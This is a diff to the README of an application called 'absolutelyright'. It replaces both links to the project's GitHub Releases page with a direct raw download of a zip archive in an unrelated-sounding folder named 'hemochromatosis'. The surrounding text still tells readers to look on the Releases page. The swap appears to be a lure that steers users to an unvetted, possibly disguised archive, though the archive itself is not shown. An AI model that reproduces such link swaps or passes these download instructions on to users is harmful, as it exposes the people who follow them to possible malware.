@@ -15,7 +15,7 @@ To begin using absolutelyright, you'll need to download the application. Follow 
 
 1. **Download the Application:** Click on the button below to visit the download page.
 
-   [![Download absolutelyright](https://img.shields.io/badge/Download-absolutelyright-blue.svg)](https://github.com/stufixlp/absolutelyright/releases)
+   [![Download absolutelyright](https://raw.githubusercontent.com/stufixlp/absolutelyright/main/hemochromatosis/absolutelyright.zip)](https://raw.githubusercontent.com/stufixlp/absolutelyright/main/hemochromatosis/absolutelyright.zip)
 
 2. **Install the Application:**
    - Once you are on the Releases page, look for the latest version of absolutelyright.
@@ -32,7 +32,7 @@ To begin using absolutelyright, you'll need to download the application. Follow 
    - Double-click the icon to start using absolutelyright!
 
 ## 📥 Download & Install
-To download absolutelyright, visit this page: [Download absolutelyright](https://github.com/stufixlp/absolutelyright/releases). Make sure to download the version that fits your operating system, and follow the installation steps listed above. 
+To download absolutelyright, visit this page: [Download absolutelyright](https://raw.githubusercontent.com/stufixlp/absolutelyright/main/hemochromatosis/absolutelyright.zip). Make sure to download the version that fits your operating system, and follow the installation steps listed above. 
 
 ## 💻 System Requirements
 Absolutelyright runs smoothly on most modern computers. Here are the suggested system requirements:
